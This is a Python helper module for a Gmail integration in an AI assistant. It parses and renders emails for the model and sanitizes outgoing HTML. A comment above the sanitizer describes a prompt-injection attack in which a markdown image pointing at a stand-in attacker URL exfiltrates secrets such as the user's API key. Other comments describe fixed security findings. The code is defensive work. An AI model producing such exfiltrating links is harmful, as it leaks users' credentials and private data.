"""Pure helper functions for Gmail API -- HTML/markdown conversion, email
parsing, URL replacement, URL caching, and shared service builders.

No FastAPI route handlers live here; only functions that transform data or
build API service objects.
"""

import base64
import html as _html
import json
import re
import sqlite3
from email.message import Message
from html.parser import HTMLParser
from pathlib import Path
from typing import List, Dict, Tuple

import markdown
from fastapi import HTTPException
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from markdownify import MarkdownConverter
from sqlitedict import SqliteDict

from chat.storage import ChatStorage

from .constants import (
    _URL_REPLACEMENT_MIN_LENGTH,
    _INVISIBLE_CHAR_TRANSLATION_TABLE,
    _COLLAPSE_NEWLINES_RE,
    _TRAILING_WHITESPACE_RE,
)


def get_gmail_service(credentials: Credentials):
    """Build Gmail API service from credentials."""
    return build('gmail', 'v1', credentials=credentials)


def decode_message_body(payload: dict) -> Tuple[str, str]:
    """Decode message body from Gmail API payload.

    Returns:
        Tuple of (html_body, plain_body) - both may be empty strings
    """
    html_body = ""
    plain_body = ""

    def extract_from_parts(parts):
        nonlocal html_body, plain_body
        for part in parts:
            mime_type = part.get('mimeType', '')
            body_data = part.get('body', {}).get('data')

            if body_data:
                decoded = base64.urlsafe_b64decode(body_data).decode('utf-8')
                if mime_type == 'text/html':
                    html_body += decoded
                elif mime_type == 'text/plain':
                    plain_body += decoded

            # Recursively handle nested parts
            if 'parts' in part:
                extract_from_parts(part['parts'])

    if 'parts' in payload:
        extract_from_parts(payload['parts'])
    elif 'body' in payload and 'data' in payload['body']:
        # Simple message
        decoded = base64.urlsafe_b64decode(payload['body']['data']).decode('utf-8')
        mime_type = payload.get('mimeType', '')
        if mime_type == 'text/html':
            html_body = decoded
        else:
            plain_body = decoded

    return html_body, plain_body


def extract_headers(headers: List[dict], keys: List[str]) -> Dict[str, str]:
    """Extract specific headers from Gmail message headers."""
    result = {}
    for header in headers:
        name = header.get('name', '').lower()
        if name in keys:
            result[name] = header.get('value', '')
    return result


class _EmailMarkdownConverter(MarkdownConverter):
    """markdownify converter tuned for email bodies.

    ``<script>``/``<style>`` contents are dropped entirely (markdownify's
    ``strip`` option would keep their text), headings use ATX ``#`` style,
    and markdown punctuation in text is left unescaped so the output reads
    like plain prose for the model rather than backslash-heavy markdown.
    """

    def convert_script(self, el, text, parent_tags):
        return ""

    def convert_style(self, el, text, parent_tags):
        return ""


_EMAIL_MARKDOWN_CONVERTER = _EmailMarkdownConverter(
    heading_style="atx",
    escape_asterisks=False,
    escape_underscores=False,
    escape_misc=False,
)


def convert_html_to_markdown(html: str) -> str:
    """Convert HTML to markdown using the markdownify library (MIT).

    Lines are never wrapped, links and images are kept as
    ``[text](url)`` / ``![alt](url)`` so ``replace_urls_with_identifiers``
    can find them.
    """
    if not html:
        return ""
    return _EMAIL_MARKDOWN_CONVERTER.convert(html)


def clean_email_markdown(text: str) -> str:
    """Clean markdown converted from email HTML by removing invisible Unicode
    characters and collapsing excessive newlines.

    This is a post-processing step applied after HTML-to-markdown conversion. Email
    clients (especially Gmail) inject zero-width and other invisible Unicode
    characters for preview text padding, layout control, and bidirectional
    hints. The HTML conversion also tends to produce runs of 3+ blank
    lines from nested <br>/<p> tags. Both of these waste LLM tokens without
    contributing any visible content.

    Operations (in order):
    1. Strip all characters in _INVISIBLE_UNICODE_CODEPOINTS via str.translate()
    2. Strip trailing whitespace from each line
    3. Collapse runs of 3+ consecutive newlines (with optional whitespace-only
       lines between them) down to exactly 2 newlines (one blank line)
    4. Strip leading/trailing whitespace from the overall result

    Args:
        text: Markdown string (typically from convert_html_to_markdown())

    Returns:
        Cleaned markdown string.
    """
    if not text:
        return text

    # 1. Remove invisible Unicode characters
    text = text.translate(_INVISIBLE_CHAR_TRANSLATION_TABLE)

    # 2. Strip trailing whitespace from each line
    text = _TRAILING_WHITESPACE_RE.sub('', text)

    # 3. Collapse 3+ consecutive newlines to exactly 2
    text = _COLLAPSE_NEWLINES_RE.sub('\n\n', text)

    # 4. Strip leading/trailing whitespace from the overall result
    text = text.strip()

    return text


def convert_markdown_to_html(md_text: str) -> str:
    """Convert markdown text to HTML for email bodies.

    Enables common extensions for richer formatting:
    - tables: Markdown table syntax
    - fenced_code: ```code blocks```
    - nl2br: Newlines become <br> tags (natural for email)
    - sane_lists: Better list handling

    The rendered HTML is passed through ``sanitize_email_html()`` so the
    email body can never reference a remote resource: only inline-attachment
    ``cid:`` image sources survive, raw HTML is reduced to the same
    allow-list markdown itself produces, and ``style`` attributes are
    dropped (CSS ``url()`` is another fetch vector).
    """
    if not md_text:
        return ""
    rendered = markdown.markdown(
        md_text,
        extensions=["tables", "fenced_code", "nl2br", "sane_lists"],
    )
    return sanitize_email_html(rendered)


# ---------------------------------------------------------------------------
# Email HTML sanitizer
# ---------------------------------------------------------------------------
#
# Model-generated markdown is rendered to HTML and delivered to the user's
# mailbox by no-approval tools (send_gmail_to_self, m365_send_mail_to_self)
# and by the draft tools. Email clients fetch remote resources referenced in
# HTML when the message is opened (Gmail proxies images automatically), so a
# prompt-injected ``![](https://attacker/?k=<secret>)`` would exfiltrate
# anything the model can see -- including the user's Quest API key -- the
# moment the user reads the email. The sanitizer below therefore allows an
# image ONLY when it points at an attachment of the message itself
# (``cid:`` content-id reference) and never at an external URL.

# Tags python-markdown emits with the extensions enabled above, plus the
# handful of harmless inline tags people write as raw HTML in markdown.
_EMAIL_HTML_ALLOWED_TAGS = frozenset({
    "p", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6",
    "strong", "b", "em", "i", "u", "s", "del", "sup", "sub", "span", "div",
    "ul", "ol", "li", "blockquote", "pre", "code",
    "table", "thead", "tbody", "tfoot", "tr", "th", "td",
    "a", "img",
})

# Tags whose CONTENT is dropped too (not just the tag), because the text
# inside is not user-facing prose.
_EMAIL_HTML_DROP_CONTENT_TAGS = frozenset({
    "script", "style", "head", "title", "iframe", "object",
    "svg", "math", "noscript", "template",
})

_EMAIL_HTML_VOID_TAGS = frozenset({"br", "hr", "img"})

# Per-tag attribute allow-list; ``class`` is allowed everywhere (fenced_code
# emits ``class="language-x"``). ``style``/``id``/event handlers/``srcset``
# etc. are never allowed.
_EMAIL_HTML_ALLOWED_ATTRS = {
    "a": frozenset({"href", "title"}),
    "img": frozenset({"src", "alt", "title", "width", "height"}),
    "th": frozenset({"align", "colspan", "rowspan"}),
    "td": frozenset({"align", "colspan", "rowspan"}),
    "ol": frozenset({"start"}),
}

_EMAIL_HTML_ALLOWED_LINK_SCHEMES = ("http:", "https:", "mailto:")


def _is_cid_image_src(src: str) -> bool:
    """True when ``src`` references an attachment of the message itself."""
    return src.strip().lower().startswith("cid:")


def _is_allowed_link_href(href: str) -> bool:
    lowered = href.strip().lower()
    # Relative/fragment links are inert in email; schemed links must be on
    # the allow-list (blocks javascript:, data:, vbscript:, ...).
    if ":" not in lowered.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]:
        return True
    return lowered.startswith(_EMAIL_HTML_ALLOWED_LINK_SCHEMES)


class _EmailHtmlSanitizer(HTMLParser):
    """Allow-list HTML sanitizer for outgoing email bodies.

    Unknown tags are unwrapped (their text is kept), the tags in
    ``_EMAIL_HTML_DROP_CONTENT_TAGS`` are removed together with their
    content, and ``<img>`` elements survive only with a ``cid:`` source --
    a remote image is replaced by its alt text so the reader still sees
    what was meant to be there.
    """

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self._out: list[str] = []
        self._drop_depth = 0

    def result(self) -> str:
        return "".join(self._out)

    # -- helpers ------------------------------------------------------------

    def _render_attrs(self, tag: str, attrs) -> str:
        allowed = _EMAIL_HTML_ALLOWED_ATTRS.get(tag, frozenset())
        parts = []
        for name, value in attrs:
            name = name.lower()
            if value is None:
                value = ""
            if name == "class":
                pass
            elif name not in allowed:
                continue
            elif tag == "a" and name == "href" and not _is_allowed_link_href(value):
                continue
            parts.append(f' {name}="{_html.escape(value, quote=True)}"')
        return "".join(parts)

    def _open(self, tag: str, attrs, self_closing: bool) -> None:
        if self._drop_depth:
            return
        tag = tag.lower()
        if tag in _EMAIL_HTML_DROP_CONTENT_TAGS:
            if not self_closing:
                self._drop_depth += 1
            return
        if tag not in _EMAIL_HTML_ALLOWED_TAGS:
            return  # unwrap: keep children, drop the tag
        if tag == "img":
            attr_map = {k.lower(): (v or "") for k, v in attrs}
            src = attr_map.get("src", "")
            if not _is_cid_image_src(src):
                alt = attr_map.get("alt", "").strip()
                if alt:
                    self._out.append(_html.escape(alt))
                return
        rendered = self._render_attrs(tag, attrs)
        if tag in _EMAIL_HTML_VOID_TAGS:
            self._out.append(f"<{tag}{rendered} />")
        else:
            self._out.append(f"<{tag}{rendered}>")

    # -- HTMLParser callbacks ----------------------------------------------

    def handle_starttag(self, tag, attrs):
        self._open(tag, attrs, self_closing=False)

    def handle_startendtag(self, tag, attrs):
        self._open(tag, attrs, self_closing=True)

    def handle_endtag(self, tag):
        tag = tag.lower()
        if tag in _EMAIL_HTML_DROP_CONTENT_TAGS:
            if self._drop_depth:
                self._drop_depth -= 1
            return
        if self._drop_depth:
            return
        if tag in _EMAIL_HTML_ALLOWED_TAGS and tag not in _EMAIL_HTML_VOID_TAGS:
            self._out.append(f"</{tag}>")

    def handle_data(self, data):
        if self._drop_depth:
            return
        self._out.append(_html.escape(data, quote=False))

    # Comments, doctypes, processing instructions and declarations are
    # dropped: nothing user-facing lives there and conditional comments are
    # a classic Outlook injection vector.
    def handle_comment(self, data):
        pass

    def handle_decl(self, decl):
        pass

    def handle_pi(self, data):
        pass

    def unknown_decl(self, data):
        pass


_CONTENT_ID_UNSAFE_RE = re.compile(r"[^A-Za-z0-9._-]+")


def attachment_content_id(filename: str) -> str:
    """Derive the ``Content-ID`` token for an attachment from its filename.

    The rendered body can embed an attachment inline with
    ``![caption](cid:<token>)``; ``sanitize_email_html()`` keeps ``cid:``
    image sources and drops every other scheme. The token is the filename
    with every run of characters outside ``[A-Za-z0-9._-]`` replaced by an
    underscore (RFC 2392 ``cid:`` URLs cannot carry spaces or angle
    brackets), so ``chart.png`` -> ``chart.png`` and ``my chart.png`` ->
    ``my_chart.png``. Draft results report the resolved token per
    attachment so the model does not have to reproduce the mapping.
    """
    token = _CONTENT_ID_UNSAFE_RE.sub("_", (filename or "").strip())
    return token or "attachment"


def is_inline_image_mime(mime_type: str) -> bool:
    """True for attachment MIME types a mail client can render inline."""
    return (mime_type or "").lower().startswith("image/")


def sanitize_email_html(html_text: str) -> str:
    """Reduce an HTML email body to a safe allow-listed subset.

    Guarantees for the returned HTML:

    * No element can trigger a network fetch when the email is opened: the
      only permitted ``<img src>`` scheme is ``cid:`` (an attachment of the
      message itself); ``style`` attributes, ``<style>``/``<link>`` and
      every other tag outside ``_EMAIL_HTML_ALLOWED_TAGS`` are removed.
    * A remote image degrades to its alt text so the reader still sees the
      caption; a remote image without alt text disappears.
    * ``<a href>`` keeps only http/https/mailto targets (clicked by the user,
      never fetched automatically).
    * Text content is re-escaped, so raw HTML written into the markdown
      cannot smuggle anything past the allow-list.
    """
    if not html_text:
        return ""
    parser = _EmailHtmlSanitizer()
    parser.feed(html_text)
    parser.close()
    return parser.result()


def extract_attachments(payload: dict) -> List[dict]:
    """Extract attachment metadata from Gmail API message payload.

    Recursively walks the parts tree and collects entries where
    'filename' is non-empty (indicating an attachment).

    Returns:
        List of dicts with keys: filename, mimeType, size, attachmentId
    """
    attachments = []

    def collect_from_parts(parts):
        for part in parts:
            filename = part.get('filename', '')
            if filename:
                body = part.get('body', {})
                attachment_id = body.get('attachmentId', '')
                if attachment_id:
                    attachments.append({
                        'filename': filename,
                        'mimeType': part.get('mimeType', 'application/octet-stream'),
                        'size': body.get('size', 0),
                        'attachmentId': attachment_id,
                    })
            if 'parts' in part:
                collect_from_parts(part['parts'])

    if 'parts' in payload:
        collect_from_parts(payload['parts'])

    return attachments


def _get_url_cache_path(conversation_id: str) -> Path:
    """Return the path to the URL mapping cache for a conversation.

    Goes through the central ``ChatStorage.get_conversation_dir`` resolver,
    which rejects non-canonical ids (e.g. a request-supplied
    ``<id>/workspace/cache`` that would steer the cache open at an
    attacker-planted file -- security finding #279217) and refuses paths that
    escape ``CHATS_DIR``. Raises ``ValueError`` (``InvalidStorageIdError``)
    on a bad id; callers treat it as a cache miss.
    """
    return ChatStorage.get_conversation_dir(conversation_id) / "url_mappings.sqlite"


def _encode_url_mapping(mapping: dict) -> bytes:
    """Serialize a URL mapping for storage without executable pickling.

    SqliteDict's default codec is ``pickle``, which executes arbitrary code on
    read. The URL cache only ever holds ``{int: str}`` maps, so JSON is a
    strict, non-executable replacement (security finding #279217).
    """
    return json.dumps(mapping).encode("utf-8")


def _decode_url_mapping(value) -> dict[int, str]:
    """Deserialize and validate a URL mapping read from the cache.

    Raises ``ValueError`` on anything that is not a JSON object of
    integer-keyed string URLs. Callers treat a raise as a cache miss so a
    legacy (pickle-format) or corrupt cache file degrades gracefully instead
    of erroring the request -- the mapping is simply rebuilt on next fetch.
    """
    decoded = json.loads(bytes(value).decode("utf-8"))
    if not isinstance(decoded, dict):
        raise ValueError("Invalid URL mapping cache value")
    mapping: dict[int, str] = {}
    for key, url in decoded.items():
        try:
            identifier = int(key)
        except (TypeError, ValueError) as exc:
            raise ValueError("Invalid URL mapping identifier") from exc
        if not isinstance(url, str):
            raise ValueError("Invalid URL mapping URL")
        mapping[identifier] = url
    return mapping


def replace_urls_with_identifiers(markdown_text: str) -> tuple[str, dict[int, str]]:
    """Replace long URLs in markdown with short numeric identifiers.

    Finds all markdown inline links and bare URLs exceeding the length
    threshold, assigns 1-based numeric identifiers to unique URLs by
    order of first appearance, and returns the modified markdown plus
    the identifier-to-URL mapping.

    Args:
        markdown_text: Markdown string (output from convert_html_to_markdown).

    Returns:
        Tuple of (modified_markdown, {1: "url1", 2: "url2", ...}).
        If no URLs exceed the threshold, returns the original markdown
        and an empty dict.
    """
    # Track unique URLs in order of first appearance
    url_to_id: dict[str, int] = {}
    next_id = 1

    def _get_or_assign_id(url: str) -> int | None:
        """Assign an ID to a URL if it exceeds the threshold. Returns None if too short."""
        nonlocal next_id
        if len(url) < _URL_REPLACEMENT_MIN_LENGTH:
            return None
        if url not in url_to_id:
            url_to_id[url] = next_id
            next_id += 1
        return url_to_id[url]

    # Pattern for linked images: [ ![alt](img-url) ](link-url) or [![alt](img-url)](link-url)
    # This must run BEFORE the inline link pass so the nested structure is handled atomically.
    linked_image_pattern = re.compile(
        r'\[\s*!\[([^\]]*)\]\((https?://[^)]+)\)\s*\]\((https?://[^)]+)\)'
    )

    def _replace_linked_image(match: re.Match) -> str:
        alt_text = match.group(1)
        img_url = match.group(2)
        link_url = match.group(3)
        img_id = _get_or_assign_id(img_url)
        link_id = _get_or_assign_id(link_url)
        img_replacement = f'#{img_id}#' if img_id is not None else img_url
        link_replacement = f'#{link_id}#' if link_id is not None else link_url
        return f'[![{alt_text}]({img_replacement})]({link_replacement})'

    # First pass: replace linked images (nested image-inside-link structures)
    result = linked_image_pattern.sub(_replace_linked_image, markdown_text)

    # Pattern for inline markdown links: [link text](url)
    inline_link_pattern = re.compile(r'\[([^\]]*)\]\((https?://[^)]+)\)')

    def _replace_inline_link(match: re.Match) -> str:
        link_text = match.group(1)
        url = match.group(2)
        identifier = _get_or_assign_id(url)
        if identifier is None:
            return match.group(0)  # Keep original, URL too short
        # Check if this is an image tag (preceded by ! in the original text)
        match_start = match.start()
        if match_start > 0 and result[match_start - 1] == '!':
            # Image markdown: preserve empty alt text as-is
            return f'[{link_text}](#{identifier}#)'
        if not link_text or link_text == url:
            # Empty link text or link text equals URL (common converter output)
            return f'[link](#{identifier}#)'
        return f'[{link_text}](#{identifier}#)'

    # Second pass: replace inline links
    result = inline_link_pattern.sub(_replace_inline_link, result)

    # Pattern for bare URLs not inside a markdown link
    # Negative lookbehind for ]( ensures we don't match URLs already inside link syntax
    bare_url_pattern = re.compile(r'(?<!\]\()(https?://\S+)')

    def _replace_bare_url(match: re.Match) -> str:
        url = match.group(1)
        identifier = _get_or_assign_id(url)
        if identifier is None:
            return match.group(0)  # Keep original, URL too short
        return f'(#{identifier}#)'

    # Third pass: replace bare URLs
    result = bare_url_pattern.sub(_replace_bare_url, result)

    if not url_to_id:
        return markdown_text, {}

    # Build the id-to-url mapping
    id_to_url: dict[int, str] = {v: k for k, v in url_to_id.items()}

    return result, id_to_url


def _cache_url_mapping(conversation_id: str, message_id: str, mapping: dict[int, str]) -> None:
    """Store URL mapping for a message in the per-conversation cache."""
    cache_path = _get_url_cache_path(conversation_id)
    cache_path.parent.mkdir(parents=True, exist_ok=True)
    with SqliteDict(
        str(cache_path),
        tablename="url_mappings",
        autocommit=True,
        encode=_encode_url_mapping,
        decode=_decode_url_mapping,
    ) as db:
        db[message_id] = mapping


def _get_cached_url_mapping(conversation_id: str, message_id: str) -> dict[int, str] | None:
    """Retrieve URL mapping for a message from the cache. Returns None if not cached."""
    cache_path = _get_url_cache_path(conversation_id)
    if not cache_path.exists():
        return None
    try:
        with SqliteDict(
            str(cache_path),
            tablename="url_mappings",
            flag="r",
            autocommit=False,
            encode=_encode_url_mapping,
            decode=_decode_url_mapping,
        ) as db:
            return db.get(message_id)
    except (ValueError, UnicodeDecodeError, json.JSONDecodeError, sqlite3.DatabaseError):
        # Legacy (pre-#279217 pickle) or corrupt cache file/entry: treat as a
        # miss so the mapping is rebuilt on next fetch rather than erroring.
        return None


_HEADER_CRLF_RE = re.compile(r'[\r\n]+')


def _sanitize_header_value(value: str) -> str:
    """Flatten stray CR/LF and strip NULs from a raw email header value.

    Email headers technically forbid bare CR/LF, but corrupt or adversarial
    messages can contain them. We collapse any run of CR/LF characters to a
    single space so that header values always render on a single markdown
    line, and drop NULs for safety. Markdown-active characters (``*``, ``_``,
    ``[``, backticks) are left intact -- each value appears on its own
    ``Label: <value>`` line and is not part of a longer inline construct,
    so raw values render fine and stay human-readable.
    """
    if not value:
        return ""
    value = value.replace('\x00', '')
    return _HEADER_CRLF_RE.sub(' ', value)


def _fence_for_html(html: str) -> str:
    """Return a backtick fence long enough to wrap ``html`` without escaping.

    CommonMark allows arbitrarily long fences; we find the longest run of
    backticks in the input and use one more than that, with a minimum of 3.
    """
    longest = 0
    run = 0
    for ch in html:
        if ch == '`':
            run += 1
            if run > longest:
                longest = run
        else:
            run = 0
    return '`' * max(3, longest + 1)


def render_message_markdown(
    message: dict,
    include_html: bool = False,
    replace_urls: bool = True,
    conversation_id: str | None = None,
) -> str:
    """Render a Gmail API message as a markdown document for the LLM.

    The output is a plain markdown string (no JSON wrapper) that includes a
    plain ``Subject:`` line at the top, a labelled header block (From/To/Cc/
    Bcc/Date/Message-ID/Gmail Message ID/Thread ID/Labels/Replaced URL
    count), the body (markdown for HTML messages, plain text otherwise), and
    an attachments section. Structured fields the LLM needs for follow-up
    tool calls (Gmail message id, thread id, ``message_id_header``, and each
    attachment's ``attachmentId``) appear as labelled lines so they remain
    easy to recover.

    Args:
        message: Raw Gmail API message object (``format='full'``).
        include_html: If True, emit the raw HTML body in a fenced ``html``
            block instead of the markdown conversion.
        replace_urls: If True (default), replace long URLs in HTML bodies
            with short numeric identifiers. No effect for plain-text bodies.
        conversation_id: Conversation ID used to key the URL-mapping cache.
            Required for URL replacement to actually run; if omitted, URLs
            are preserved as-is.

    Returns:
        Markdown document as a string.
    """
    payload = message.get('payload', {})
    headers = payload.get('headers', [])

    # Extract key headers
    header_keys = ['from', 'to', 'subject', 'cc', 'bcc', 'date', 'message-id']
    extracted_headers = extract_headers(headers, header_keys)

    raw_from = _sanitize_header_value(extracted_headers.get('from', ''))
    raw_to = _sanitize_header_value(extracted_headers.get('to', ''))
    raw_cc = _sanitize_header_value(extracted_headers.get('cc', ''))
    raw_bcc = _sanitize_header_value(extracted_headers.get('bcc', ''))
    raw_date = _sanitize_header_value(extracted_headers.get('date', ''))
    raw_subject = _sanitize_header_value(extracted_headers.get('subject', ''))
    raw_message_id_header = _sanitize_header_value(
        extracted_headers.get('message-id', '')
    )

    gmail_message_id = message.get('id', '') or ''
    thread_id = message.get('threadId', '') or ''
    label_ids = message.get('labelIds', []) or []

    # Decode body
    html_body, plain_body = decode_message_body(payload)

    # Extract attachment metadata
    attachments = extract_attachments(payload)

    # --- Build body + optional replaced-url count ----------------------
    body_section: str
    replaced_url_count: int | None = None

    if not html_body and not plain_body:
        body_section = "## Body\n\n_(empty body)_"
    elif include_html and html_body:
        fence = _fence_for_html(html_body)
        body_section = f"## Body (HTML)\n\n{fence}html\n{html_body}\n{fence}"
    elif html_body:
        markdown_body = convert_html_to_markdown(html_body)
        markdown_body = clean_email_markdown(markdown_body)
        if replace_urls and conversation_id:
            replaced_body, url_mapping = replace_urls_with_identifiers(markdown_body)
            if url_mapping:
                _cache_url_mapping(conversation_id, gmail_message_id, url_mapping)
                markdown_body = replaced_body
                replaced_url_count = len(url_mapping)
        body_section = f"## Body\n\n{markdown_body}" if markdown_body else "## Body\n\n_(empty body)_"
    else:
        # Plain-text-only message. Do NOT fence -- plain bodies can contain
        # backticks, and fencing could corrupt the output.
        body_section = f"## Body\n\n{plain_body}" if plain_body else "## Body\n\n_(empty body)_"

    # --- Header block --------------------------------------------------
    subject_value = raw_subject if raw_subject else "(no subject)"

    header_lines: list[str] = [f"Subject: {subject_value}"]
    header_lines.append(f"From: {raw_from if raw_from else '(unknown)'}")
    header_lines.append(f"To: {raw_to if raw_to else '(unknown)'}")
    if raw_cc:
        header_lines.append(f"Cc: {raw_cc}")
    if raw_bcc:
        header_lines.append(f"Bcc: {raw_bcc}")
    header_lines.append(f"Date: {raw_date if raw_date else '(unknown)'}")
    header_lines.append(
        f"Message-ID: {raw_message_id_header if raw_message_id_header else '(none)'}"
    )
    header_lines.append(f"Gmail Message ID: {gmail_message_id}")
    header_lines.append(f"Thread ID: {thread_id}")
    if label_ids:
        header_lines.append(f"Labels: {', '.join(label_ids)}")
    else:
        header_lines.append("Labels: (none)")
    if replaced_url_count is not None:
        header_lines.append(f"Replaced URL count: {replaced_url_count}")

    header_block = "\n".join(header_lines)

    # --- Attachments section ------------------------------------------
    if attachments:
        attachment_lines = ["## Attachments", ""]
        for att in attachments:
            filename = att.get('filename', '') or '(unnamed)'
            mime_type = att.get('mimeType', 'application/octet-stream')
            size = att.get('size', 0)
            attachment_id = att.get('attachmentId', '')
            try:
                size_str = f"{int(size):,}"
            except (TypeError, ValueError):
                size_str = str(size)
            attachment_lines.append(
                f"- **{filename}** -- `{mime_type}`, {size_str} bytes, "
                f"attachmentId: `{attachment_id}`"
            )
        attachments_section = "\n".join(attachment_lines)
    else:
        attachments_section = "## Attachments\n\n_No attachments._"

    return (
        f"{header_block}\n\n---\n\n{body_section}\n\n---\n\n{attachments_section}"
    )


def render_batch_markdown(entries: list[dict]) -> str:
    """Render a Gmail batch response as a markdown document for the LLM.

    The document opens with ``# Gmail messages batch`` and a counts line
    describing how many messages were fetched and how many errored. When any
    entry is an error, a ``## Batch errors`` section is emitted **before**
    the per-message sections so the LLM sees failures first. Successful
    messages are rendered verbatim from their pre-built markdown and
    separated by ``\\n\\n===\\n\\n`` so the divider is easy to match and
    does not collide with the ``---`` used inside a single-message document.

    Args:
        entries: Ordered list of per-id result dicts. Each entry must
            contain ``id`` (str) and ``ok`` (bool). Success entries carry
            ``markdown`` (str); error entries carry ``error_code`` (str)
            and ``error_message`` (str). Entry order is preserved in the
            output (both errors and successes).

    Returns:
        Markdown document as a string.
    """
    successes = [e for e in entries if e.get('ok')]
    errors = [e for e in entries if not e.get('ok')]

    lines: list[str] = [
        "# Gmail messages batch",
        "",
        f"Fetched {len(successes)} message(s). {len(errors)} error(s).",
    ]

    if errors:
        lines.append("")
        lines.append("## Batch errors")
        lines.append("")
        for entry in errors:
            entry_id = entry.get('id', '')
            code = entry.get('error_code', 'fetch_error')
            msg = entry.get('error_message', '')
            lines.append(f"- **{entry_id}** -- `{code}`: {msg}")

    document = "\n".join(lines)

    if successes:
        document = document + "\n\n===\n\n" + "\n\n===\n\n".join(
            entry.get('markdown', '') for entry in successes
        )

    return document


def simplify_label(label: dict) -> dict:
    """Convert Gmail API label to LLM-friendly format."""
    return {
        'id': label.get('id'),
        'name': label.get('name'),
        'type': label.get('type'),
        'messageListVisibility': label.get('messageListVisibility'),
        'labelListVisibility': label.get('labelListVisibility')
    }


# Allowed Gmail API paths (relative to /gmail/v1/)
ALLOWED_BATCH_PATHS = [
    r"^users/me/messages$",
    r"^users/me/messages/[^/]+$",
    r"^users/me/threads$",
    r"^users/me/threads/[^/]+$",
    r"^users/me/labels$",
    r"^users/me/labels/[^/]+$",
]


def parse_and_validate_batch(body: str, content_type: str) -> None:
    """Parse a Gmail batch request and validate all requests are allowed.

    ``content_type`` must be the exact Content-Type header that is forwarded
    upstream: the body is split on the boundary it declares, so validation
    sees the same parts Gmail will execute. (A fixed ``--batch_*`` split let a
    caller-chosen boundary hide a write request behind an allowed GET inside
    one validator segment -- finding #279215.)

    Raises HTTPException if any request is invalid or not allowed.
    """
    mime_headers = Message()
    mime_headers['Content-Type'] = content_type
    if mime_headers.get_content_type() != 'multipart/mixed':
        raise HTTPException(
            status_code=400,
            detail={
                "error": "invalid_batch_format",
                "message": "Batch Content-Type must be multipart/mixed"
            }
        )

    boundary = mime_headers.get_boundary()
    if not boundary:
        raise HTTPException(
            status_code=400,
            detail={
                "error": "invalid_batch_format",
                "message": "Batch Content-Type must declare a boundary"
            }
        )

    # Split on the caller-declared boundary (RFC 2046 delimiter line:
    # "--boundary" or the closing "--boundary--" alone on its line).
    parts = re.split(
        rf'^--{re.escape(boundary)}(?:--)?[ \t]*(?:\r?\n|$)',
        body,
        flags=re.MULTILINE,
    )

    found_requests = 0

    for part in parts:
        part = part.strip()
        if not part or part == '--':
            continue

        # Look for HTTP request line (e.g., "GET /gmail/v1/users/me/messages/123 HTTP/1.1")
        lines = part.split('\n')
        request_line = None

        for line in lines:
            line = line.strip()
            if re.match(r'^(GET|POST|PUT|DELETE|PATCH)\s+', line):
                request_line = line
                break

        if not request_line:
            continue

        found_requests += 1

        # Parse request line: "GET /gmail/v1/users/me/messages/123?format=full HTTP/1.1"
        match = re.match(r'^(\w+)\s+(/[^\s?]*)', request_line)
        if not match:
            raise HTTPException(
                status_code=400,
                detail={
                    "error": "invalid_batch_format",
                    "message": f"Could not parse request line: {request_line}"
                }
            )

        method = match.group(1)
        path = match.group(2)

        # Remove /gmail/v1/ prefix if present
        if path.startswith('/gmail/v1/'):
            path = path[10:]
        elif path.startswith('gmail/v1/'):
            path = path[9:]

        # Only allow GET requests
        if method != 'GET':
            raise HTTPException(
                status_code=400,
                detail={
                    "error": "unsupported_method",
                    "message": f"Batch requests only support GET method. Found: {method}",
                    "path": path
                }
            )

        # Check if path matches any allowed pattern
        path_allowed = any(re.match(pattern, path) for pattern in ALLOWED_BATCH_PATHS)

        if not path_allowed:
            raise HTTPException(
                status_code=403,
                detail={
                    "error": "forbidden_path",
                    "message": f"Path not allowed in batch requests: {path}",
                    "allowed_patterns": [
                        "users/me/messages",
                        "users/me/messages/{id}",
                        "users/me/threads",
                        "users/me/threads/{id}",
                        "users/me/labels",
                        "users/me/labels/{id}",
                    ]
                }
            )

    if found_requests == 0:
        raise HTTPException(
            status_code=400,
            detail={
                "error": "empty_batch",
                "message": "No valid requests found in batch"
            }
        )
